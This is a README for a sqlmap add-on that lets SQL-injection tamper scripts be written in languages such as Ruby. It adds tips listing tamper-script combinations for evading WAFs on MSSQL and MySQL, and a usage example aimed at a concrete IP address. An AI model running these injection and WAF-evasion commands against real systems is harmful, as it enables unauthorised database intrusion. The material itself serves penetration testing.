# SQLmap Tamper-API
It's an API for SQLmap tamper scripts allows you to use your favorite programming language to write your tamper scripts.

This API solves SQLmap limitation of accepting only python to write tamper scripts.

## How it works
**`taper-api.py`** script sends the **payload** and **kwargs** in a JSON format ( `{"payload": "", "kwargs": {"headers": {}}}` ) to the foreign tamper script's STDIN as an argument.

From there the foreign script parses the JSON and process it then sends it as a JSON format again to STDOUT where `tamper-api.py` reads and parses then sends it to SQLmap.

```
    ,-------(returns objects)---------,
    |                                 |
[ sqlmap ] --(sends objects)--> [tamper-api] --(sends json)--> [your-script]
                                      ^                             |
                                      |________(returns json)_______|  

```


Example

```ruby
#!/usr/bin/env ruby
#
# Author:       KING SABRI | @KINGSABRI
# Description:  Base64 encoding all characters in a given payload
# Requirements: None
#
require 'json'
require 'base64'

@json    = JSON.parse(ARGV[0])
@payload = @json["payload"]
@kwargs  = @json["kwargs"]

@json["payload"] = Base64.urlsafe_encode64(@payload)

print @json.to_json
```

**Don't Forget:**
- Copy `tamper-api.py` script into sqlmap/tamper directory.
- Check `tamper-scripts/[YOUR_LANGUAGE]` for practical examples.


## Usage
```
sqlmap -v3 -u https://144.91.86.150/xmlrpc.php --tamper tamper-api base64encode.rb
```

## Contribution
1. Fork
2. Clone : `https://github.com/[USERNAME]/sqlmap-multi-language-tamper.git`
3. Create a new branch: `git checkout -b YourBranch`
4. Commit changes: `git  add * && git commit 'description'`
5. Create Pull Request(PR)

Or, open an issue for new requests and bugs reporting!

# SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips
Use and load all tamper scripts to evade filters and WAF :
~~~python
sqlmap -u ‘http://www.site.com/search.cmd?form_state=1’ — level=5 — risk=3 -p ‘item1’ — tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
~~~
General Tamper testing:
~~~
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
~~~
MSSQL:
~~~
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
~~~
MySQL:
~~~
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
~~~

Here [lists of sqlmap Tamper scripts](https://github.com/readloud/SQLmap-Tamper-API/blob/main/tamper-list.md) with explanation.
